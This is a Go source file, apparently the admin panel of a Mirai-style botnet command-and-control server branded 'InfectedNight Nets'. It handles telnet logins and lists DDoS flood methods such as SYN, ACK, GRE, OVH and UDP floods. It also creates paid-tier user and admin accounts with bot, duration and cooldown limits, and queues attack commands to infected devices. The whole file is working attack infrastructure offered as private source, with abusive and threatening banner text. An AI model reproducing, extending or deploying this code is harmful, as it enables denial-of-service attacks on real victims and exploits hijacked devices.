package main

import (
    "fmt"
    "net"
    "time"
    "strings"
    "strconv"
)

type Admin struct {
    conn    net.Conn
}

func NewAdmin(conn net.Conn) *Admin {
    return &Admin{conn}
}

func (this *Admin) Handle() {
    this.conn.Write([]byte("\033[?1049h"))
    this.conn.Write([]byte("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22"))

    defer func() {
        this.conn.Write([]byte("\033[?1049l"))
    }()

    this.conn.SetDeadline(time.Now().Add(60 * time.Second))
    this.conn.Write([]byte("\033[2J\033[1H"))
    this.conn.Write([]byte("\033[38;5;28mUsername\033[38;5;87m: \033[0m"))
    username, err := this.ReadLine(false)
    if err != nil {
        return
    }

    this.conn.SetDeadline(time.Now().Add(60 * time.Second))
    this.conn.Write([]byte("\033[2J\033[1H"))
    this.conn.Write([]byte("\033[38;5;28mPassword\033[38;5;87m: \033[0m"))
    password, err := this.ReadLine(true)
    if err != nil {
        return
    }

    this.conn.SetDeadline(time.Now().Add(120 * time.Second))
    this.conn.Write([]byte("\r\n"))
	spinBuf := []byte{'-', '\\', '|', '/'}
    for i := 0; i < 15; i++ {
        this.conn.Write(append([]byte("\r\x1b[0;36mLogin successfully \033[38;5;87m"), spinBuf[i % len(spinBuf)]))
        time.Sleep(time.Duration(300) * time.Millisecond)
    }
	this.conn.Write([]byte("\r\n"))


    var loggedIn bool
    var userInfo AccountInfo
    if loggedIn, userInfo = database.TryLogin(username, password); !loggedIn {
        this.conn.Write([]byte("\r\x1b[0;34mNo retards allowed, GTFO\r\n"))
        this.conn.Write([]byte("\r\x1b[0;31m[ \x1b[0;35mInfectedNight Nets \x1b[0;37m- \x1b[0;35mPrivate Source \x1b[0;31m]\r\n"))
        buf := make([]byte, 1)
        this.conn.Read(buf)
        return
    }

	this.conn.Write([]byte("\033[2J\033[1H"))

    go func() {
        i := 0
        for {
            var BotCount int
            if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
                BotCount = userInfo.maxBots
            } else {
                BotCount = clientList.Count()
            }

            time.Sleep(time.Second)
            if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0;%d Devices | %s\007", BotCount, username))); err != nil {
                this.conn.Close()
                break
            }
            i++
            if i % 60 == 0 {
                this.conn.SetDeadline(time.Now().Add(120 * time.Second))
            }
        }
    }()

    for {
        var botCatagory string
        var botCount int
        this.conn.Write([]byte(" \033[38;5;15m[\033[38;5;87mInfected\033[38;5;27mNight\033[38;5;15m]~ \033[38;5;15m "))
        cmd, err := this.ReadLine(false)
        if err != nil || cmd == "exit" || cmd == "quit" {
            return
        }
        if cmd == "" {
            continue
        }
		if err != nil || cmd == "cls" || cmd == "clear" {
	this.conn.Write([]byte("\033[2J\033[1H"))
			continue
		}

        if cmd == "met" || cmd == "m" || cmd == "?"  || cmd == "methods" {
            this.conn.Write([]byte("\033[2J\033[1H"))
            this.conn.Write([]byte("\033[38;5;28m. . : : | \033[38;5;15mTCP Methods \033[38;5;28m| : : . .  . . : : |\033[38;5;15m UDP Method\033[38;5;28m | : : . .  \r\n"))
            this.conn.Write([]byte("\033[38;5;28m  !syn     \033[38;5;160m[\033[38;5;28mIP\033[38;5;160m] [\033[38;5;28mTIME\033[38;5;160m]             !udpgen   \033[38;5;160m[\033[38;5;28mIP\033[38;5;160m] [\033[38;5;28mTIME\033[38;5;160m]         \r\n"))
            this.conn.Write([]byte("\033[38;5;28m  !ack     \033[38;5;160m[\033[38;5;28mIP\033[38;5;160m] [\033[38;5;28mTIME\033[38;5;160m]             !udphex   \033[38;5;160m[\033[38;5;28mIP\033[38;5;160m] [\033[38;5;28mTIME\033[38;5;160m]         \r\n"))
            this.conn.Write([]byte("\033[38;5;28m  !stomp   \033[38;5;160m[\033[38;5;28mIP\033[38;5;160m] [\033[38;5;28mTIME\033[38;5;160m]             !udpflood \033[38;5;160m[\033[38;5;28mIP\033[38;5;160m] [\033[38;5;28mTIME\033[38;5;160m]         \r\n"))
            this.conn.Write([]byte("\033[38;5;28m  !storm   \033[38;5;160m[\033[38;5;28mIP\033[38;5;160m] [\033[38;5;28mTIME\033[38;5;160m]             !udpplain \033[38;5;160m[\033[38;5;28mIP\033[38;5;160m] [\033[38;5;28mTIME\033[38;5;160m]         \r\n"))
            this.conn.Write([]byte("\033[38;5;28m  !greip   \033[38;5;160m[\033[38;5;28mIP\033[38;5;160m] [\033[38;5;28mTIME\033[38;5;160m]             !vse      \033[38;5;160m[\033[38;5;28mIP\033[38;5;160m] [\033[38;5;28mTIME\033[38;5;160m]         \r\n"))
            this.conn.Write([]byte("\033[38;5;28m  !greeth  \033[38;5;160m[\033[38;5;28mIP\033[38;5;160m] [\033[38;5;28mTIME\033[38;5;160m]             !std      \033[38;5;160m[\033[38;5;28mIP\033[38;5;160m] [\033[38;5;28mTIME\033[38;5;160m]         \r\n"))
            this.conn.Write([]byte("\033[38;5;28m  !ovh     \033[38;5;160m[\033[38;5;28mIP\033[38;5;160m] [\033[38;5;28mTIME\033[38;5;160m]             !stdhex   \033[38;5;160m[\033[38;5;28mIP\033[38;5;160m] [\033[38;5;28mTIME\033[38;5;160m]         \r\n"))
            this.conn.Write([]byte("\033[38;5;28m                                                                 \r\n"))
            this.conn.Write([]byte("\033[38;5;28m      Just a quick reminder that if you \033[38;5;160mSPAM\033[38;5;28m attacks             \r\n"))
            this.conn.Write([]byte("\033[38;5;28m                  \033[38;5;28mI will \033[38;5;160mSPAM \033[38;5;28myour life!                         \r\n"))
            this.conn.Write([]byte("\033[38;5;28m                                                                 \r\n"))
            this.conn.Write([]byte("\033[38;5;28m\r\n"))
            continue
        }

        if userInfo.admin == 1 && cmd == "help" {
            this.conn.Write([]byte("\033[2J\033[1H"))
            this.conn.Write([]byte("\033[38;5;28m. . : : | \033[38;5;15mTCP Methods \033[38;5;28m| : : . .  . . : : |\033[38;5;15m UDP Method\033[38;5;28m | : : . .  \r\n"))
            this.conn.Write([]byte("\033[38;5;28m  !syn     \033[38;5;160m[\033[38;5;28mIP\033[38;5;160m] [\033[38;5;28mTIME\033[38;5;160m]             !udpgen   \033[38;5;160m[\033[38;5;28mIP\033[38;5;160m] [\033[38;5;28mTIME\033[38;5;160m]         \r\n"))
            this.conn.Write([]byte("\033[38;5;28m  !ack     \033[38;5;160m[\033[38;5;28mIP\033[38;5;160m] [\033[38;5;28mTIME\033[38;5;160m]             !udphex   \033[38;5;160m[\033[38;5;28mIP\033[38;5;160m] [\033[38;5;28mTIME\033[38;5;160m]         \r\n"))
            this.conn.Write([]byte("\033[38;5;28m  !stomp   \033[38;5;160m[\033[38;5;28mIP\033[38;5;160m] [\033[38;5;28mTIME\033[38;5;160m]             !udpflood \033[38;5;160m[\033[38;5;28mIP\033[38;5;160m] [\033[38;5;28mTIME\033[38;5;160m]         \r\n"))
            this.conn.Write([]byte("\033[38;5;28m  !storm   \033[38;5;160m[\033[38;5;28mIP\033[38;5;160m] [\033[38;5;28mTIME\033[38;5;160m]             !udpplain \033[38;5;160m[\033[38;5;28mIP\033[38;5;160m] [\033[38;5;28mTIME\033[38;5;160m]         \r\n"))
            this.conn.Write([]byte("\033[38;5;28m  !greip   \033[38;5;160m[\033[38;5;28mIP\033[38;5;160m] [\033[38;5;28mTIME\033[38;5;160m]             !vse      \033[38;5;160m[\033[38;5;28mIP\033[38;5;160m] [\033[38;5;28mTIME\033[38;5;160m]         \r\n"))
            this.conn.Write([]byte("\033[38;5;28m  !greeth  \033[38;5;160m[\033[38;5;28mIP\033[38;5;160m] [\033[38;5;28mTIME\033[38;5;160m]             !std      \033[38;5;160m[\033[38;5;28mIP\033[38;5;160m] [\033[38;5;28mTIME\033[38;5;160m]         \r\n"))
            this.conn.Write([]byte("\033[38;5;28m  !ovh     \033[38;5;160m[\033[38;5;28mIP\033[38;5;160m] [\033[38;5;28mTIME\033[38;5;160m]             !stdhex   \033[38;5;160m[\033[38;5;28mIP\033[38;5;160m] [\033[38;5;28mTIME\033[38;5;160m]         \r\n"))
            this.conn.Write([]byte("\033[38;5;28m                                                                 \r\n"))
            this.conn.Write([]byte("\033[38;5;28m      Just a quick reminder that if you \033[38;5;160mSPAM\033[38;5;28m attacks             \r\n"))
            this.conn.Write([]byte("\033[38;5;28m                  \033[38;5;28mI will \033[38;5;160mSPAM \033[38;5;28myour life!                         \r\n"))
            this.conn.Write([]byte("\033[38;5;28m                                                                 \r\n"))
            this.conn.Write([]byte("\033[38;5;28m\r\n"))
            continue
        }

        botCount = userInfo.maxBots

        if userInfo.admin == 1 && cmd == "user" {
            this.conn.Write([]byte("\033[38;5;87m-\033[38;5;87m>\033[38;5;87m Enter That User Name: "))
            new_un, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\033[38;5;87m-\033[38;5;87m>\033[38;5;87m Choose His Password: "))
            new_pw, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\033[38;5;87m-\033[38;5;87m>\033[38;5;87m Bot Limit (-1 For Full Net): "))
            max_bots_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            max_bots, err := strconv.Atoi(max_bots_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[38;5;87m-\033[38;5;87m>\033[38;5;87m \033[38;5;87m%s\033[0m\r\n", "Failed To Parse The Bot Count")))
                continue
            }
            this.conn.Write([]byte("\033[38;5;87m-\033[38;5;87m>\033[38;5;87m Attack Time (-1 For None): "))
            duration_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            duration, err := strconv.Atoi(duration_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[38;5;87m-\033[38;5;87m>\033[38;5;87m \x1b[0;37%s\033[0m\r\n", "Failed To Parse The Attack Duration Limit")))
                continue
            }
            this.conn.Write([]byte("\033[38;5;87m-\033[38;5;87m>\033[38;5;87m Cooldown Time (0 For None): "))
            cooldown_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            cooldown, err := strconv.Atoi(cooldown_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[38;5;87m-\033[38;5;87m>\033[38;5;87m \033[38;5;87m%s\033[0m\r\n", "Failed To Parse The Cooldown")))
                continue
            }
            this.conn.Write([]byte("\033[38;5;87m-\033[38;5;87m>\033[38;5;87m New Account Info: \r\nUsername: " + new_un + "\r\nPassword: " + new_pw + "\r\nBotcount: " + max_bots_str + "\r\nReady For This Shit? (Y/N): "))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.CreateUser(new_un, new_pw, max_bots, duration, cooldown) {
                this.conn.Write([]byte(fmt.Sprintf("\033[38;5;87m-\033[38;5;87m>\033[38;5;87m \033[38;5;87m%s\033[0m\r\n", "Failed To Create New User. An Unknown Error Occured.")))
            } else {
                this.conn.Write([]byte("\033[38;5;87m-\033[38;5;87m>\033[38;5;87m User Added Successfully.\033[0m\r\n"))
            }
            continue
        }
        
        if userInfo.admin == 1 && cmd == "remove" {
            this.conn.Write([]byte("Username: "))
            new_un, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if !database.removeUser(new_un) {
                this.conn.Write([]byte("User doesn't exists.\r\n"))
            } else {
                this.conn.Write([]byte("User removed\r\n"))
            }
            continue
        }
        if userInfo.admin == 1 && cmd == "admin" {
            this.conn.Write([]byte("Username: "))
            new_un, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("Password: "))
            new_pw, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("-1 for Full Bots.\r\n"))
            this.conn.Write([]byte("Allowed Bots: "))
            max_bots_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            max_bots, err := strconv.Atoi(max_bots_str)
            if err != nil {
                continue
            }
            this.conn.Write([]byte("0 for Max attack duration. \r\n"))
            this.conn.Write([]byte("Allowed Duration: "))
            duration_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            duration, err := strconv.Atoi(duration_str)
            if err != nil {
                continue
            }
            this.conn.Write([]byte("0 for no cooldown. \r\n"))
            this.conn.Write([]byte("Cooldown: "))
            cooldown_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            cooldown, err := strconv.Atoi(cooldown_str)
            if err != nil {
                continue
            }
            this.conn.Write([]byte("Username: " + new_un + "\r\n"))
            this.conn.Write([]byte("Password: " + new_pw + "\r\n"))
            this.conn.Write([]byte("Duration: " + duration_str + "\r\n"))
            this.conn.Write([]byte("Cooldown: " + cooldown_str + "\r\n"))
            this.conn.Write([]byte("Bots: " + max_bots_str + "\r\n"))
            this.conn.Write([]byte(""))
            this.conn.Write([]byte("Confirm(y): "))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.createAdmin(new_un, new_pw, max_bots, duration, cooldown) {
                this.conn.Write([]byte("Failed to create Admin! \r\n"))
            } else {
                this.conn.Write([]byte("Admin created! \r\n"))
            }
            continue
        }
        if cmd == "botcount" || cmd == "bots" || cmd == "count" {
		botCount = clientList.Count()
            m := clientList.Distribution()
            for k, v := range m {
                this.conn.Write([]byte(fmt.Sprintf("\033[38;5;28m%s: \x1b[0;36m%d\033[0m\r\n\033[0m", k, v)))
            }
			this.conn.Write([]byte(fmt.Sprintf("\033[38;5;87mTotal: \033[38;5;28m%d\r\n\033[0m", botCount)))
            continue
        }
        if cmd[0] == '-' {
            countSplit := strings.SplitN(cmd, " ", 2)
            count := countSplit[0][1:]
            botCount, err = strconv.Atoi(count)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[38;5;87mFailed To Parse Botcount \"%s\"\033[0m\r\n", count)))
                continue
            }
            if userInfo.maxBots != -1 && botCount > userInfo.maxBots {
                this.conn.Write([]byte(fmt.Sprintf("\033[38;5;87mBot Count To Send Is Bigger Than Allowed Bot Maximum\033[0m\r\n")))
                continue
            }
            cmd = countSplit[1]
        }
        if cmd[0] == '@' {
            cataSplit := strings.SplitN(cmd, " ", 2)
            botCatagory = cataSplit[0][1:]
            cmd = cataSplit[1]
        }

        atk, err := NewAttack(cmd, userInfo.admin)
        if err != nil {
            this.conn.Write([]byte(fmt.Sprintf("\033[38;5;87m%s\033[0m\r\n", err.Error())))
        } else {
            buf, err := atk.Build()
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[38;5;87m%s\033[0m\r\n", err.Error())))
            } else {
                if can, err := database.CanLaunchAttack(username, atk.Duration, cmd, botCount, 0); !can {
                    this.conn.Write([]byte(fmt.Sprintf("\033[38;5;87m%s\033[0m\r\n", err.Error())))
                } else if !database.ContainsWhitelistedTargets(atk) {
                    clientList.QueueBuf(buf, botCount, botCatagory)
                } else {
                    fmt.Println("Blocked Attack By " + username + " To Whitelisted Prefix")
                }
            }
        }
    }
}

func (this *Admin) ReadLine(masked bool) (string, error) {
    buf := make([]byte, 1024)
    bufPos := 0

    for {
        n, err := this.conn.Read(buf[bufPos:bufPos+1])
        if err != nil || n != 1 {
            return "", err
        }
        if buf[bufPos] == '\xFF' {
            n, err := this.conn.Read(buf[bufPos:bufPos+2])
            if err != nil || n != 2 {
                return "", err
            }
            bufPos--
        } else if buf[bufPos] == '\x7F' || buf[bufPos] == '\x08' {
            if bufPos > 0 {
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos--
            }
            bufPos--
        } else if buf[bufPos] == '\r' || buf[bufPos] == '\t' || buf[bufPos] == '\x09' {
            bufPos--
        } else if buf[bufPos] == '\n' || buf[bufPos] == '\x00' {
            this.conn.Write([]byte("\r\n"))
            return string(buf[:bufPos]), nil
        } else if buf[bufPos] == 0x03 {
            this.conn.Write([]byte("^C\r\n"))
            return "", nil
        } else {
            if buf[bufPos] == '\x1B' {
                buf[bufPos] = '^';
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos++;
                buf[bufPos] = '[';
                this.conn.Write([]byte(string(buf[bufPos])))
            } else if masked {
                this.conn.Write([]byte("*"))
            } else {
                this.conn.Write([]byte(string(buf[bufPos])))
            }
        }
        bufPos++
    }
    return string(buf), nil
}
